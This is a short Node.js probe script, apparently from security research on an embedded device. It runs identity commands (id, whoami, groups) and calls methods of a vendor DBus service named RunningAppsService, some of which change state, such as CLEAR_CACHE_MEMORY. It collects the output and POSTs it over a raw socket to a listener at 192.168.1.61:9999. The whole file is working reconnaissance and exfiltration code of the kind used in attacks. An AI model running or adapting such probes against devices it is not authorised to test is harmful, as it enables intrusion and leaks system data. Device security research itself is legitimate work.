"use strict";

/* p105: RunningAppsService DBus GET/CLEAR methods */
var cp = null;
try { cp = require('child_process'); } catch (e) {}

var HOST = '192.168.1.61';
var PORT = 9999;
var RAS = 'com.native.RunningAppsServiceDBUS';
var RAS_PATH = '/com/native/RunningAppsServiceDBUS';
var R = { ts: new Date().toISOString(), probe: 'p105', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  try {
    var net = require('net');
    var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
    var s = net.connect(PORT, HOST);
    s.setTimeout(180000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 300000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p105info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  if (!cp) return '[no cp]';
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function call(method, args) {
  return run('dbus-send --system --print-reply --dest=' + RAS + ' ' + RAS_PATH + ' com.native.RunningApps_DBUS.' + method + ' ' + args + ' 2>&1', 30000, 2000);
}

function main() {
  R.results.s0_id = run('id; whoami; groups 2>&1', 10000, 500);
  var methods = ['GET_CPU_VALUE','GET_PSS_VALUE','GET_APP_DATA_VALUE','CLEAR_CACHE_MEMORY','INIT_SYS_CPU','GET_SYS_CPU','GET_TOP_VWINS','GET_OOM_SCORE'];
  methods.forEach(function(m, i) {
    R.results['g_'+i] = call(m, '');
  });
  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
